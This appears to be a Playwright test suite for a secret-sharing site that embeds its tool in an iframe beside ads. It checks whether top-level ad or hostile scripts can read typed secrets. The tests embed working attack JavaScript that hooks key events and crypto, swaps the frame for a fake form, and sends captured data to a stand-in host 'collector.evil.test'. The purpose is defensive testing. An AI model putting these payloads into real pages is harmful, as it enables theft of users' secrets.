#!/usr/bin/env python3
"""The site with ads around the framed tool, under the production hostnames.

https://apikeybin.com is served from site/public and https://app.apikeybin.com is forwarded to the
real local Worker, with both names virtual inside Playwright, so the origins and the
frame-ancestors value are exactly what production has. Nothing leaves this machine: any other
host is recorded and aborted.

Questions:
  * Can a script running at the top of the page (where an ad script must run) read what is typed
    into the tool, the link it makes, or the key? It is checked with a hostile script, and with
    Google's real ad scripts, kept locally, whose outgoing requests are all stopped and recorded.
  * What can it still do? Replacing the frame with a fake form works. That is the residual risk
    the site tells people about, so a test keeps it honest in both directions.
  * Who else can frame the tool?
"""
from __future__ import annotations

import asyncio
import contextlib
import json
import os
import re
import sys
import tempfile
from pathlib import Path
from urllib.parse import unquote, urlparse

from playwright.async_api import async_playwright

from common import ROOT, Results, Server, b64u, parse_link, unique_ip  # noqa: F401

SITE = (Path(os.environ["APIKEYBIN_WEB"]).parent / "site/public") if os.environ.get("APIKEYBIN_WEB") else ROOT / "site/public"
TYPED = "STRIPE_KEY=sk_live_CANARY_typed_0123456789"
PASS = "canary-passphrase-xyz"
# Google's code is not in this repository. verify/README.md says what to put here.
ADSENSE_DIR = Path(os.environ.get("APIKEYBIN_ADSENSE_DIR") or Path.home() / ".cache/apikeybin/adsense_scripts")


class Skip(Exception):
    """A test that could not run. It is reported as not tested, not as passed."""

HOSTILE = """
(function () {
  var C = 'https://collector.evil.test/c';
  function leak(tag, val) {
    try { new Image().src = C + '?tag=' + encodeURIComponent(tag) + '&d=' + encodeURIComponent(String(val)); } catch (e) {}
  }
  leak('ran', '1');
  function attempt(tag, fn) { try { leak(tag, fn()); } catch (e) { leak(tag + '_blocked', e && e.name); } }
  function poke() {
    var f = document.getElementById('tool');
    attempt('frame_doc', function () { return f.contentDocument.documentElement.outerHTML; });
    attempt('frame_text', function () { return f.contentWindow.document.getElementById('text').value; });
    attempt('frame_link', function () { return f.contentWindow.document.getElementById('link').textContent; });
    attempt('frame_url', function () { return f.contentWindow.location.href; });
    attempt('frame_hook', function () { f.contentWindow.crypto.subtle.encrypt = function () {}; return 'hooked'; });
    attempt('frame_named', function () { return window.frames[0].document.body.innerHTML; });
    try { f.contentWindow.postMessage({ text: 'give me the secret' }, '*'); } catch (e) {}
  }
  setInterval(poke, 200);
  var s = crypto.subtle, oE = s.encrypt.bind(s);
  s.encrypt = function (a, k, d) { leak('top_encrypt', new TextDecoder().decode(d)); return oE.apply(null, arguments); };
  ['keydown', 'keypress', 'input', 'paste', 'copy'].forEach(function (name) {
    document.addEventListener(name, function (e) { leak('event_' + name, (e.key || '') + (e.target && e.target.value || '')); }, true);
  });
  window.addEventListener('message', function (e) { leak('message', JSON.stringify(e.data)); });
  // A direct call to the API from this origin.
  fetch('https://app.apikeybin.com/api/s/AAAAAAAAAAAAAAAAAAAAAA/open', { method: 'POST', headers: { 'Content-Type': 'application/json', 'X-Apikeybin': '1' }, body: '{"token":"x"}' })
    .then(function (r) { leak('api_from_top', r.status); }, function () { leak('api_from_top_blocked', '1'); });
})();
"""

# What a compromised top-level script can still do, and the reason the site offers an ad-free screen.
HOSTILE_SWAP = """
(function () {
  var f = document.getElementById('tool');
  var fake = document.createElement('textarea');
  fake.id = 'fake';
  f.replaceWith(fake);
  fake.addEventListener('input', function () {
    new Image().src = 'https://collector.evil.test/c?tag=fake_form&d=' + encodeURIComponent(fake.value);
  });
})();
"""

ADSENSE_TAG = (
    '<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-0000000000000000" crossorigin="anonymous"></script>'
    '<ins class="adsbygoogle" style="display:inline-block;width:300px;height:250px" data-ad-client="ca-pub-0000000000000000" data-ad-slot="1234567890"></ins>'
    "<script>(adsbygoogle = window.adsbygoogle || []).push({});</script>"
)


def site_headers():
    out = {}
    for line in (SITE / "_headers").read_text().splitlines():
        if line.startswith("  ") and ":" in line:
            name, value = line.strip().split(":", 1)
            out[name] = value.strip()
    return out


class World:
    def __init__(self, server, head_extra="", body_extra="", framer_page=None, as_shipped=False):
        self.server = server
        self.as_shipped = as_shipped
        self.head_extra = head_extra
        self.body_extra = body_extra
        self.framer_page = framer_page
        self.cushion_script = None
        self.hold_cushion = None
        self.cushion_asked = asyncio.Event()
        self.log = []
        self.ip = unique_ip()

    def tags(self):
        return {t for t, _ in self.collected()}

    def collected(self):
        out = []
        for r in self.log:
            if r["host"] == "collector.evil.test":
                q = dict(p.split("=", 1) for p in r["query"].split("&") if "=" in p)
                out.append((unquote(q.get("tag", "")), unquote(q.get("d", ""))))
        return out

    def anywhere(self, needle):
        """Every request that left the two real origins, and every byte it carried."""
        hits = []
        for r in self.log:
            if r["host"] in ("apikeybin.com", "app.apikeybin.com"):
                continue
            hay = unquote(unquote(r["url"])) + "\n" + (r["body"] or "") + "\n" + (r["referer"] or "")
            if needle in hay:
                hits.append(r["url"][:120])
        return hits

    async def handle(self, route, request):
        u = urlparse(request.url)
        host = u.hostname or ""
        try:
            headers = await asyncio.wait_for(request.all_headers(), 3)
        except Exception:  # noqa: BLE001
            headers = request.headers
        self.log.append({"url": request.url, "host": host, "path": u.path, "query": u.query, "method": request.method,
                         "body": request.post_data, "referer": headers.get("referer"), "frame": request.frame.url if request.frame else ""})
        if host == "apikeybin.com":
            await self.site(route, u)
        elif host == "app.apikeybin.com":
            await self.app(route, request, u, headers)
        elif host == "ads.evil.test":
            await route.fulfill(status=200, headers={"Content-Type": "text/javascript"}, body=HOSTILE)
        elif host == "ads2.evil.test":
            await route.fulfill(status=200, headers={"Content-Type": "text/javascript"}, body=HOSTILE_SWAP)
        elif host == "collector.evil.test":
            await route.fulfill(status=204, headers={"Access-Control-Allow-Origin": "*"})
        elif host == "evil.test":
            await route.fulfill(status=200, headers={"Content-Type": "text/html"}, body=self.framer_page or "<!doctype html>")
        elif "/pagead/js/adsbygoogle.js" in request.url and (ADSENSE_DIR / "adsbygoogle.js.txt").exists():
            await route.fulfill(status=200, headers={"Content-Type": "text/javascript", "Access-Control-Allow-Origin": "*"},
                                body=(ADSENSE_DIR / "adsbygoogle.js.txt").read_bytes())
        elif "show_ads_impl_with_ama" in request.url and (ADSENSE_DIR / "show_ads_impl_with_ama.js.txt").exists():
            await route.fulfill(status=200, headers={"Content-Type": "text/javascript", "Access-Control-Allow-Origin": "*"},
                                body=(ADSENSE_DIR / "show_ads_impl_with_ama.js.txt").read_bytes())
        elif "show_ads_impl" in request.url and (ADSENSE_DIR / "show_ads_impl.js.txt").exists():
            await route.fulfill(status=200, headers={"Content-Type": "text/javascript", "Access-Control-Allow-Origin": "*"},
                                body=(ADSENSE_DIR / "show_ads_impl.js.txt").read_bytes())
        else:
            await route.abort()

    async def site(self, route, u):
        path = u.path
        name = {"/": "index.html", "/open": "open.html"}.get(path, path.lstrip("/"))
        if name.endswith("/"):
            name += "index.html"
        if name == "open.html" and self.hold_cushion is not None:
            self.cushion_asked.set()
            await self.hold_cushion.wait()
        if not (SITE / name).exists() and (SITE / f"{name}.html").exists():
            name += ".html"
        file = SITE / name
        if not file.exists():
            await route.fulfill(status=404, body="")
            return
        data = file.read_bytes()
        ctype = {"html": "text/html; charset=utf-8", "css": "text/css", "svg": "image/svg+xml", "txt": "text/plain"}[name.rsplit(".", 1)[-1]]
        # These tests are about the ads being there. The pages ship without them until they are live.
        if (name in ("index.html", "open.html") or name.startswith("guides/")) and not self.as_shipped:
            data = data.replace(b' class="no-ads"', b"")
        if name in ("index.html", "open.html"):
            data = data.decode().replace("</head>", self.head_extra + "</head>").replace("</body>", self.body_extra + "</body>").encode()
        if name == "open.html" and self.cushion_script:
            data = data.decode().replace("</body>", "<script>" + self.cushion_script + "</script></body>").encode()
        await route.fulfill(status=200, headers={"Content-Type": ctype, **site_headers()}, body=data)

    async def app(self, route, request, u, headers):
        target = f"http://127.0.0.1:{self.server.port}{u.path}" + (f"?{u.query}" if u.query else "")
        forward = {k: v for k, v in headers.items() if k.lower() not in ("host", "content-length", "connection", "cookie")}
        forward["cf-connecting-ip"] = self.ip
        try:
            response = await route.fetch(url=target, headers=forward, max_redirects=0)
            await route.fulfill(response=response)
        except Exception:  # noqa: BLE001
            # A test may close its page while the frame is still loading. Nobody is waiting for this
            # answer then, and if somebody is, their own wait fails.
            with contextlib.suppress(Exception):
                await route.abort()


async def open_world(browser, server, context=None, **kw):
    world = World(server, **kw)
    ctx = await browser.new_context(service_workers="block", **(context or {}))
    await ctx.route("**/*", world.handle)
    page = await ctx.new_page()
    return world, ctx, page


DRAWN = "new Promise(done => requestAnimationFrame(() => requestAnimationFrame(done)))"


async def press(page, locator):
    """A real click, once the page has been drawn where it lands.

    Chromium sends a click to whatever it last drew at that point. Just after loading or scrolling,
    that can be the tool's frame, which is another process, instead of the page around it, and the
    click is lost: measured 6 of 2,700, and the frame received them. Nobody can press that fast. With
    this wait it was 0 of 6,000. Pressing again instead would also hide a button that does nothing.
    """
    await locator.scroll_into_view_if_needed()
    await locator.evaluate(f"() => {DRAWN}")
    await page.evaluate(DRAWN)
    await locator.click()


async def use_tool_in_frame(page, typed=TYPED, passphrase=None):
    await page.goto("https://apikeybin.com/", wait_until="domcontentloaded")
    frame = page.frame_locator("#tool")
    await frame.locator("#text").wait_for(state="visible", timeout=20000)
    await press(page, frame.locator("#text"))
    await frame.locator("#text").fill(typed)
    await page.keyboard.type("x")  # real key events, in case a listener outside could see them
    if passphrase:
        await frame.locator("#passphrase").fill(passphrase)
    await press(page, frame.locator("#make"))
    await frame.locator("#result").wait_for(state="visible", timeout=20000)
    link = await frame.locator("#link").text_content()
    return link


async def count_in(frame, selector) -> int:
    """A frame the browser blocked can hang or error instead of answering, and that means none."""
    try:
        return await asyncio.wait_for(frame.locator(selector).count(), 3)
    except Exception:  # noqa: BLE001
        return 0


async def s_the_tool_works_in_the_frame_and_the_reader_gets_it_after_the_page_with_ads(browser, server):
    world, ctx, page = await open_world(browser, server)
    link = await use_tool_in_frame(page)
    assert link.startswith("https://app.apikeybin.com/s/"), link
    read = await ctx.new_page()
    await through_the_cushion(read, link)
    await read.click("#open")
    await read.locator("#output").wait_for(state="visible", timeout=20000)
    assert await read.locator("#output").text_content() == TYPED + "x"
    hosts = {r["host"] for r in world.log}
    assert hosts <= {"apikeybin.com", "app.apikeybin.com"}, hosts
    await ctx.close()


async def s_a_hostile_script_at_the_top_reads_nothing(browser, server):
    world, ctx, page = await open_world(browser, server, head_extra='<script src="https://ads.evil.test/ad.js"></script>')
    link = await use_tool_in_frame(page, passphrase=PASS)
    _, _, secret = parse_link(link)
    await page.wait_for_timeout(700)
    tags = world.tags()
    assert "ran" in tags, "the hostile script never ran, so nothing was tested"
    # It tried, and every attempt was stopped by the browser.
    for name in ["frame_doc", "frame_text", "frame_link", "frame_url", "frame_hook", "frame_named"]:
        assert f"{name}_blocked" in tags, (name, tags)
        assert name not in tags, f"{name} succeeded"
    for needle in [TYPED, TYPED[:20], PASS, b64u(secret), link.split("#")[1]]:
        assert world.anywhere(needle) == [], needle
    # Key events go to the frame, so a listener at the top sees none of them.
    assert not [t for t in tags if t.startswith("event_")], tags
    assert "top_encrypt" not in tags, "encryption ran at the top"
    # Calling the API from this origin. Under interception Playwright answers the CORS preflight
    # itself, so the browser may let the call through here. What must hold is the server's
    # answer, which is a refusal: test_api.py shows real responses carry no CORS headers and that
    # a real Sec-Fetch-Site of same-site gets 403. This forwarding path may not carry that header.
    answers = [d for t, d in world.collected() if t == "api_from_top"]
    assert "api_from_top_blocked" in tags or set(answers) <= {"400", "403"}, (tags, answers)
    await ctx.close()


async def s_a_compromised_script_can_still_swap_the_frame_for_a_fake(browser, server):
    # The honest limit. If this ever stops being true the site's warning can change; until then
    # the warning stays, and this test is why.
    world, ctx, page = await open_world(browser, server, body_extra='<script src="https://ads2.evil.test/swap.js"></script>')
    await page.goto("https://apikeybin.com/", wait_until="domcontentloaded")
    await page.locator("#fake").wait_for(state="visible", timeout=15000)
    await page.locator("#fake").fill(TYPED)
    await page.wait_for_timeout(300)
    assert world.anywhere(TYPED), "expected the fake form to capture this"
    await ctx.close()
    html = (SITE / "index.html").read_text()
    assert "偽の入力欄に差し替えられます" in html, "the site no longer tells people about this"
    assert 'href="https://app.apikeybin.com/"' in html, "the site no longer offers the ad-free screen"


async def s_googles_real_ad_script_sees_nothing_of_the_tool(browser, server):
    if not (ADSENSE_DIR / "adsbygoogle.js.txt").exists():
        raise Skip(f"no local copy of the ad scripts in {ADSENSE_DIR}")
    world, ctx, page = await open_world(browser, server, head_extra=ADSENSE_TAG)
    link = await use_tool_in_frame(page, passphrase=PASS)
    _, _, secret = parse_link(link)
    await page.wait_for_timeout(9000)
    ad_requests = [r for r in world.log if "/pagead/ads" in r["url"]]
    assert ad_requests, "no ad request was made, so nothing was tested"
    urls = {unquote(r["query"]).split("&url=")[1].split("&")[0] for r in ad_requests if "&url=" in unquote(r["query"])}
    assert urls and all(u.startswith("https://apikeybin.com/") for u in urls), urls
    left = [r for r in world.log if r["host"] not in ("apikeybin.com", "app.apikeybin.com")]
    assert left, "nothing tried to leave, so nothing was tested"
    for needle in [TYPED, "CANARY", PASS, b64u(secret), "app.apikeybin.com/s/"]:
        assert world.anywhere(needle) == [], (needle, world.anywhere(needle)[:2])
    await ctx.close()


async def s_only_the_site_can_frame_the_tool(browser, server):
    framer = '<!doctype html><iframe id="f" src="https://app.apikeybin.com/embed"></iframe>'
    world, ctx, page = await open_world(browser, server, framer_page=framer)
    await page.goto("https://evil.test/", wait_until="domcontentloaded")
    await page.wait_for_timeout(1200)
    inside = sum([await count_in(f, "#text") for f in page.frames if f != page.main_frame])
    assert inside == 0, "another site could put the tool in a frame"
    await ctx.close()
    for path in ["/", "/s/" + "A" * 22]:
        framer = f'<!doctype html><iframe id="f" src="https://app.apikeybin.com{path}"></iframe>'
        world, ctx, page = await open_world(browser, server, framer_page=framer)
        await page.goto("https://evil.test/", wait_until="domcontentloaded")
        await page.wait_for_timeout(800)
        inside = sum([await count_in(f, "#text, #open, #state-badlink") for f in page.frames if f != page.main_frame])
        assert inside == 0, f"{path} could be framed"
        await ctx.close()
    # Not even the site may frame the reading page.
    body_extra = '<iframe id="r" src="https://app.apikeybin.com/s/' + "A" * 22 + '"></iframe>'
    world, ctx, page = await open_world(browser, server, body_extra=body_extra)
    await page.goto("https://apikeybin.com/", wait_until="domcontentloaded")
    await page.wait_for_timeout(1000)
    inside = sum([await count_in(f, "#state-badlink") for f in page.frames if "/s/" in f.url])
    assert inside == 0, "the site could frame the reading page"
    await ctx.close()


async def through_the_cushion(page, link):
    """What a person does: opens the link, lands on the page with ads, and goes on."""
    await page.goto(link, wait_until="domcontentloaded")
    await page.wait_for_url("https://apikeybin.com/open#go", timeout=20000)
    await page.locator("a.button").first.click()
    await page.wait_for_url("https://app.apikeybin.com/open", timeout=20000)
    await page.locator("#open").wait_for(state="visible", timeout=20000)


async def s_a_reader_passes_the_page_with_ads_and_reads_after_it(browser, server):
    world, ctx, page = await open_world(browser, server)
    rid, secret, _ = server.create(TYPED, name=".env")
    link = f"https://app.apikeybin.com/s/{rid}#1.{b64u(secret)}"
    await through_the_cushion(page, link)
    assert "#" not in page.url
    # Coming back to the reading page does not use the link up.
    assert server.sql("SELECT COUNT(*) FROM secrets WHERE id = ?", rid)[0][0] == 1
    await page.reload()
    await page.locator("#open").wait_for(state="visible", timeout=20000)
    await page.click("#open")
    await page.locator("#output").wait_for(state="visible", timeout=20000)
    assert await page.locator("#output").text_content() == TYPED
    assert await page.locator("#output-name").text_content() == ".env"
    # Nothing stays behind.
    assert await page.evaluate("sessionStorage.length") == 0
    await page.reload()
    await page.locator("#state-nopending").wait_for(state="visible", timeout=20000)
    await ctx.close()


async def s_the_page_with_ads_never_sees_the_key_or_the_id(browser, server):
    # A hostile script and everything else on that page. The key must not exist there at all.
    # A window it opens is measured by web-threat/session_probe.py: Playwright cannot intercept a
    # popup's first navigation.
    probe = """
    (function () {
      var C = 'https://collector.evil.test/c';
      function leak(t, v) { new Image().src = C + '?tag=' + t + '&d=' + encodeURIComponent(String(v)); }
      leak('ran', '1');
      leak('href', location.href);
      leak('referrer', document.referrer);
      try { leak('session', JSON.stringify(sessionStorage)); } catch (e) { leak('session_blocked', e.name); }
      try { leak('nav', performance.getEntriesByType('navigation')[0].name); } catch (e) {}
      try { leak('hist', history.length); } catch (e) {}
      var f = document.createElement('iframe');
      f.src = 'https://app.apikeybin.com/open';
      document.body.append(f);
      setTimeout(function () {
        try { leak('frame_session', f.contentWindow.sessionStorage.getItem('apikeybin.pending')); }
        catch (e) { leak('frame_blocked', e.name); }
      }, 500);
    })();
    """
    world, ctx, page = await open_world(browser, server)
    world.cushion_script = probe
    rid, secret, _ = server.create(TYPED)
    fragment = b64u(secret)
    await page.goto(f"https://app.apikeybin.com/s/{rid}#1.{fragment}", wait_until="domcontentloaded")
    await page.wait_for_url("https://apikeybin.com/open#go", timeout=20000)
    await page.wait_for_timeout(1400)
    tags = world.tags()
    assert "ran" in tags, "the hostile script never ran, so nothing was tested"
    assert "frame_blocked" in tags and "frame_session" not in tags, tags
    for needle in [fragment, rid, TYPED]:
        assert world.anywhere(needle) == [], (needle, world.anywhere(needle)[:2])
    site_requests = [r for r in world.log if r["host"] == "apikeybin.com"]
    assert site_requests and not [r for r in site_requests if rid in r["url"] or (r["referer"] and rid in r["referer"])]
    # And the reader can still go on.
    await page.locator("a.button").first.click()
    await page.wait_for_url("https://app.apikeybin.com/open", timeout=20000)
    await page.click("#open")
    await page.locator("#output").wait_for(state="visible", timeout=20000)
    await ctx.close()


async def s_googles_real_ad_script_on_that_page_sees_no_key_or_id(browser, server):
    if not (ADSENSE_DIR / "adsbygoogle.js.txt").exists():
        raise Skip(f"no local copy of the ad scripts in {ADSENSE_DIR}")
    world, ctx, page = await open_world(browser, server, head_extra=ADSENSE_TAG)
    rid, secret, _ = server.create(TYPED)
    fragment = b64u(secret)
    await page.goto(f"https://app.apikeybin.com/s/{rid}#1.{fragment}", wait_until="domcontentloaded")
    await page.wait_for_url("https://apikeybin.com/open#go", timeout=20000)
    await page.wait_for_timeout(9000)
    ad_requests = [r for r in world.log if "/pagead/ads" in r["url"]]
    assert ad_requests, "no ad request was made, so nothing was tested"
    urls = {unquote(r["query"]).split("&url=")[1].split("&")[0] for r in ad_requests if "&url=" in unquote(r["query"])}
    assert urls == {"https://apikeybin.com/open#go"}, urls
    for needle in [fragment, rid, TYPED]:
        assert world.anywhere(needle) == [], (needle, world.anywhere(needle)[:2])
    await ctx.close()


async def s_the_trip_takes_no_key_when_storage_is_unavailable(browser, server):
    # With no sessionStorage the reader goes straight to the content rather than lose the link.
    world, ctx, page = await open_world(browser, server)
    await ctx.add_init_script(
        "Object.defineProperty(window, 'sessionStorage', { get() { throw new Error('blocked'); } });"
    )
    rid, secret, _ = server.create(TYPED)
    await page.goto(f"https://app.apikeybin.com/s/{rid}#1.{b64u(secret)}", wait_until="domcontentloaded")
    await page.locator("#open").wait_for(state="visible", timeout=20000)
    assert "/s/" in page.url
    assert not [r for r in world.log if r["host"] == "apikeybin.com"]
    await page.click("#open")
    await page.locator("#output").wait_for(state="visible", timeout=20000)
    await ctx.close()


async def s_coming_back_with_nothing_pending_says_so(browser, server):
    world, ctx, page = await open_world(browser, server)
    await page.goto("https://app.apikeybin.com/open", wait_until="domcontentloaded")
    await page.locator("#state-nopending").wait_for(state="visible", timeout=20000)
    # An old entry does not count.
    rid, secret, _ = server.create(TYPED)
    old = json.dumps({"id": rid, "fragment": "#1." + b64u(secret), "at": 1})
    await page.evaluate("v => sessionStorage.setItem('apikeybin.pending', v)", old)
    await page.reload()
    await page.locator("#state-nopending").wait_for(state="visible", timeout=20000)
    assert await page.evaluate("sessionStorage.length") == 0, "the expired entry stayed"
    # A malformed entry neither crashes nor requests anything.
    await page.evaluate("v => sessionStorage.setItem('apikeybin.pending', v)", json.dumps({"id": "../x", "fragment": "#1.x", "at": 9e15}))
    await page.reload()
    await page.locator("#state-badlink").wait_for(state="visible", timeout=20000)
    assert not [r for r in world.log if r["method"] == "POST"]
    # A well-formed key with an id that is not one: only the check on the id stops this.
    entry = json.dumps({"id": "../x", "fragment": "#1." + b64u(secret), "at": 9e15})
    await page.evaluate("v => sessionStorage.setItem('apikeybin.pending', v)", entry)
    await page.reload()
    await page.locator("#state-badlink").wait_for(state="visible", timeout=20000)
    assert await page.evaluate("sessionStorage.length") == 0, "the bad entry stayed"
    assert not [r for r in world.log if r["method"] == "POST"]
    await ctx.close()


async def s_the_key_is_out_of_the_address_bar_while_the_page_with_ads_loads(browser, server):
    # On a slow connection the reading page stays on screen until the next one arrives.
    world, ctx, page = await open_world(browser, server)
    world.hold_cushion = asyncio.Event()
    rid, secret, _ = server.create(TYPED)
    await page.goto(f"https://app.apikeybin.com/s/{rid}#1.{b64u(secret)}", wait_until="commit")
    await asyncio.wait_for(world.cushion_asked.wait(), 20)
    # The address of the page still on screen. In Chromium, evaluate would wait for the trip to end.
    for _ in range(20):
        if page.url == "https://app.apikeybin.com/open":
            break
        await asyncio.sleep(0.1)
    assert page.url == "https://app.apikeybin.com/open", page.url
    world.hold_cushion.set()
    await page.wait_for_url("https://apikeybin.com/open#go", timeout=20000)
    await ctx.close()


async def s_a_preview_bot_that_runs_javascript_burns_nothing_on_the_trip(browser, server):
    world, ctx, page = await open_world(browser, server)
    rid, secret, _ = server.create(TYPED)
    await page.goto(f"https://app.apikeybin.com/s/{rid}#1.{b64u(secret)}", wait_until="domcontentloaded")
    await page.wait_for_url("https://apikeybin.com/open#go", timeout=20000)
    await page.wait_for_timeout(500)
    assert server.sql("SELECT COUNT(*) FROM secrets WHERE id = ?", rid)[0][0] == 1
    await ctx.close()


async def s_the_page_with_ads_has_content_and_no_automatic_move(browser, server):
    # AdSense forbids ads on screens used for navigation, and on pages that redirect by themselves.
    # This cannot prove compliance, but it keeps the page from drifting into the obvious case.
    html = (SITE / "open.html").read_text()
    assert "<script" not in html, "no script: no timer, no automatic redirect"
    assert 'http-equiv' not in html, "no meta refresh"
    assert 'href="https://app.apikeybin.com/open"' in html
    assert html.count('class="ad-label">広告<') >= 2
    text = re.sub(r"<[^>]+>", "", html[html.index("<main>"):])
    assert len(text) > 500, f"too little content: {len(text)} characters"
    assert text.count("広告の枠") <= 3
    assert html.count("<section>") >= 3


def distance(a, b):
    """Between two boxes from bounding_box(). 0 when they touch or overlap."""
    dx = max(a["x"] - (b["x"] + b["width"]), b["x"] - (a["x"] + a["width"]), 0)
    dy = max(a["y"] - (b["y"] + b["height"]), b["y"] - (a["y"] + a["height"]), 0)
    return (dx * dx + dy * dy) ** 0.5


async def visible_boxes(locator):
    out = []
    for i in range(await locator.count()):
        box = await locator.nth(i).bounding_box()
        if box and await locator.nth(i).is_visible():
            out.append(box)
    return out


# Width, height and whether it is a phone. A phone shows no drop zone, so the buttons sit differently.
SCREENS = [(360, 740, True), (390, 844, True), (768, 1024, True), (360, 740, False), (390, 844, False), (768, 1024, False), (1001, 800, False), (1200, 800, False), (1440, 900, False)]


def screens_for(browser):
    # Firefox here has no phone mode.
    return [s for s in SCREENS if not (s[2] and browser.browser_type.name == "firefox")]


async def on_screen(browser, server, width, height, phone):
    context = {"viewport": {"width": width, "height": height}}
    if phone:
        context.update(is_mobile=True, has_touch=True)
    return await open_world(browser, server, context=context)


async def every_state_of_the_tool(page, visit):
    """The buttons move: a message or a long file name pushes them down inside the frame."""
    frame = page.frame_locator("#tool")
    await frame.locator("#make").wait_for(state="visible", timeout=20000)
    await visit(frame, "the tool")
    await frame.locator("#text").fill("x" * 70000)
    await press(page, frame.locator("#make"))
    await frame.locator("#err-big").wait_for(state="visible", timeout=20000)
    await visit(frame, "with a message")
    await frame.locator("#text").fill("")
    with tempfile.TemporaryDirectory() as tmp:
        path = Path(tmp) / ("n" * 100 + ".env")
        path.write_bytes(b"KEY=1\n")
        await frame.locator("#file").set_input_files(str(path))
        await frame.locator("#file-chip").wait_for(state="visible", timeout=20000)
    await visit(frame, "with a long file name")
    await press(page, frame.locator("#clear-file"))
    await frame.locator("#text").fill("x")
    await frame.locator("#passphrase").fill("y")
    await press(page, frame.locator("#make"))
    await frame.locator("#result").wait_for(state="visible", timeout=20000)
    await visit(frame, "the finished link")


async def s_ads_keep_their_distance_from_every_button(browser, server):
    # The one number Google gives: "moving ad units 150 pixels away from your content". It is measured
    # for everything that can be used, because a layout change can quietly cross it.
    for width, height, phone in screens_for(browser):
        world, ctx, page = await on_screen(browser, server, width, height, phone)

        async def check(buttons, where):
            ads = await visible_boxes(page.locator(".ad-box"))
            assert ads, (width, where, "no ad on this screen")
            for b in buttons:
                for a in ads:
                    gap = distance(a, b)
                    assert gap >= 150, (width, phone, where, round(gap), a, b)

        await page.goto("https://apikeybin.com/open#go", wait_until="domcontentloaded")
        await check(await visible_boxes(page.locator("a.button")), "the page with ads")

        async def visit(frame, where):
            await check(await visible_boxes(frame.locator("button:visible, textarea:visible, input:visible, select:visible")), where)

        await page.goto("https://apikeybin.com/", wait_until="domcontentloaded")
        await every_state_of_the_tool(page, visit)
        await ctx.close()


async def s_the_tool_fits_its_frame(browser, server):
    # The frame has a fixed height: a scroll bar inside it would hide the button.
    for width, height, phone in screens_for(browser):
        world, ctx, page = await on_screen(browser, server, width, height, phone)
        await page.goto("https://apikeybin.com/", wait_until="domcontentloaded")

        async def visit(frame, where):
            inner = next(f for f in page.frames if f.url.endswith("/embed"))
            over = await inner.evaluate("document.documentElement.scrollHeight - innerHeight")
            assert over <= 0, (width, phone, where, over)

        await every_state_of_the_tool(page, visit)
        await ctx.close()


async def s_the_button_and_an_ad_are_on_the_first_screen(browser, server):
    for width, height, phone in [s for s in screens_for(browser) if (s[0], s[1]) in ((390, 844), (1200, 800))]:
        world, ctx, page = await on_screen(browser, server, width, height, phone)
        await page.goto("https://apikeybin.com/", wait_until="domcontentloaded")
        frame = page.frame_locator("#tool")
        await frame.locator("#make").wait_for(state="visible", timeout=20000)
        make = await frame.locator("#make").bounding_box()
        assert make["y"] + make["height"] <= height, (width, phone, make)
        ad = await page.locator(".ad-top .ad-box").bounding_box()
        assert ad["y"] + ad["height"] <= height, (width, phone, ad)
        await ctx.close()


async def s_ads_stay_within_the_share_of_the_page_better_ads_allows(browser, server):
    # "Ads that take up more than 50% of the vertical height of a page", and 30% on a phone.
    for width, height, limit in [(390, 844, 0.30), (1001, 800, 0.50), (1200, 800, 0.50)]:
        for path in ["/", "/open", "/open#go"]:
            world, ctx, page = await open_world(browser, server, context={"viewport": {"width": width, "height": height}})
            await page.goto("https://apikeybin.com" + path, wait_until="domcontentloaded")
            ads = await visible_boxes(page.locator(".ad-box"))
            total = await page.evaluate("document.documentElement.scrollHeight")
            share = sum(a["height"] for a in ads) / total
            assert ads and share <= limit, (width, path, round(share, 3))
            await ctx.close()


async def s_until_the_ads_are_live_no_empty_place_for_one_shows(browser, server):
    for width, height in [(390, 844), (1200, 800)]:
        for path in ["/", "/open", "/open#go"]:
            world, ctx, page = await open_world(browser, server, as_shipped=True, context={"viewport": {"width": width, "height": height}})
            await page.goto("https://apikeybin.com" + path, wait_until="domcontentloaded")
            assert await visible_boxes(page.locator(".ad-box")) == [], (width, path)
            assert "広告の枠" not in await page.locator("body").inner_text(), (width, path)
            await ctx.close()
    world, ctx, page = await open_world(browser, server, as_shipped=True)
    await page.goto("https://apikeybin.com/", wait_until="domcontentloaded")
    await page.frame_locator("#tool").locator("#make").wait_for(state="visible", timeout=20000)
    await ctx.close()


async def s_the_pages_a_public_site_needs_are_there(browser, server):
    # AdSense requires a privacy policy with this in it, and "We do not allow Google-served ads on
    # screens under construction", which is what an empty ad place looks like.
    privacy = (SITE / "privacy.html").read_text()
    for needed in ["第三者配信事業者", "過去にアクセスした際の情報", "https://www.google.com/settings/ads", "www.aboutads.info", "広告配信事業者の一覧"]:
        assert needed in privacy, needed
    sitemap = (SITE / "sitemap.xml").read_text()
    guides = [(f"guides/{p.name}", "/guides/" if p.name == "index.html" else f"/guides/{p.stem}") for p in sorted((SITE / "guides").glob("*.html"))]
    assert len(guides) == 7, guides
    for name, path in [("index.html", "/"), ("open.html", "/open"), ("privacy.html", "/privacy"), ("terms.html", "/terms"), ("report.html", "/report"), *guides]:
        html = (SITE / name).read_text()
        assert "<script" not in html, name
        assert f"<loc>https://apikeybin.com{path}</loc>" in sitemap, name
        assert f'<link rel="canonical" href="https://apikeybin.com{path}">' in html, name
    # Every page with a footer links to the source, in the same place, once (SPEC §19.1).
    source = "https://github.com/apikeybin/apikeybin"
    want = f'<a href="/report">通報</a> <a href="{source}" rel="noopener">GitHub</a></nav></footer>'
    footers = [p for p in site_pages() if "<footer" in p.read_text()]
    assert len(footers) == 12, [p.name for p in footers]
    for p in footers:
        html = p.read_text()
        assert html.count("<footer") == 1 and html.count(want) == 1, p.name
        # The share card: the page's own title, description and address, and the one image (SPEC §19.1).
        title = re.search(r"<title>([^<]+)</title>", html).group(1)
        description = re.search(r'<meta name="description" content="([^"]+)">', html).group(1)
        canonical = re.search(r'<link rel="canonical" href="([^"]+)">', html).group(1)
        kind = "article" if p.parent.name == "guides" and p.name != "index.html" else "website"
        for prop, value in [("og:type", kind), ("og:site_name", "APIキー便"), ("og:locale", "ja_JP"), ("og:title", title),
                            ("og:description", description), ("og:url", canonical), ("og:image", "https://apikeybin.com/og.png"),
                            ("og:image:width", "1200"), ("og:image:height", "630")]:
            assert html.count(f'<meta property="{prop}" content="{value}">') == 1, (p.name, prop)
        assert html.count('property="og:') == 10 and html.count('<meta name="twitter:card" content="summary_large_image">') == 1, p.name
    png = (SITE / "og.png").read_bytes()
    assert png[:8] == b"\x89PNG\r\n\x1a\n", "og.png is not a PNG"
